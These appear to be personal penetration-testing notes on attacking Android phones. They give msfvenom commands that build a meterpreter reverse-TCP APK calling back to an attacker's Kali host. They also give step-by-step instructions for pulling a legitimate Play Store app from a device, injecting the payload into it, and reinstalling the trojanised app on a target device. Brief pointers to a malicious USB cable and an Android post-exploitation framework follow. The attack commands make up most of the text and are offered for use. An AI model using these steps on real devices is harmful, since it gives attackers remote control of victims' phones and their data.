In line attack - malicious cable - hak5 omg cable
hackerwarehouse.com

meterpreter - apk
**msfvenom -p android/meterpreter/reverse_tcp LHOST=<kali_IP> LPORT=<your_port> R><myapp.apk>**

This will make an app with a generic looking icon named "Main Activity"

Install it to your target phone: adb install myapp.apk

sign the app using keytool
jarsigner\
zipalign

---
If using apktool from the Kali-Repo, check version with command:

- apktool -version (if version is 2.x.x-dirty, you will need to remove it with the following commands, per this article: [https://github.com/iBotPeaches/Apktool/issues/2149](https://github.com/iBotPeaches/Apktool/issues/2149))
- sudo apt remove apktool
- sudo apt autoremove
- Then reinstall apktool from ibotpeaches source, as shown here for Linux Machines: [https://ibotpeaches.github.io/Apktool/install/](https://ibotpeaches.github.io/Apktool/install/)

To inject an app from the play store:

1. Download app to your android device
2. Pull using adb
3. pm list packages | grep <app_name>
4. pm path <app_package_name>
5. exit adb shell, the adb pull <path_to_apk/base.apk> -o <my_app.apk>
6. After you have the apk, use the following msfvenom command to inject it automatically:
7. msfvenom -x <my_app.apk> -p android/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=<my_port> -o <my_app_hacked.apk>
8. Uninstall the app from the target device, and install the hacked version using adb install <my_app_hacked.apk>

If you are interested in exploiting an app manually I highly suggest following this article from Black Hills Infosec: [https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)

---
Ghost framework - android post exploitation
https://github.com/ParikhKadam/ghost-1